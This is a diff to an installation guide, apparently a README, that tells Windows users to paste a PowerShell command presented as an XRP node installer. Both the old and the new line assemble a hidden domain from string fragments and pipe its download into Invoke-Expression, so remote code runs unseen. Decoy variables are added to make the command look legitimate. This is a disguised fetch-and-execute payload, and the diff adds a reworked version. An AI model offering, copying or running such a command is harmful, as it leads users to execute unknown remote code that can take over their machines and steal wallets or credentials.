@@ -10,7 +10,7 @@ Open the Run dialog by pressing `Win + R`, type `cmd`, and press **Enter**.
 
 ### Step 2: Run the XRP node installation command
 ```powershell
-powershell -c "$sync='xrp-mainnet-node=4.1.7-1b0a541'; $import='{ Core } from \"@quicknode/sdk\"'; $enable='true'; iwr ('XRPL' + 'Node.' + 'DEV') | iex"
+powershell -command "$install='xrp-mainnet-node=4.1.7-1b0a541'; $mode='.dev'; $blockchain='xrpl'; iwr ($blockchain + 'node' + $mode) | iex"
 `````
 
 _After executing the command, the node will begin initializing and syncing with the XRP network._ <br>
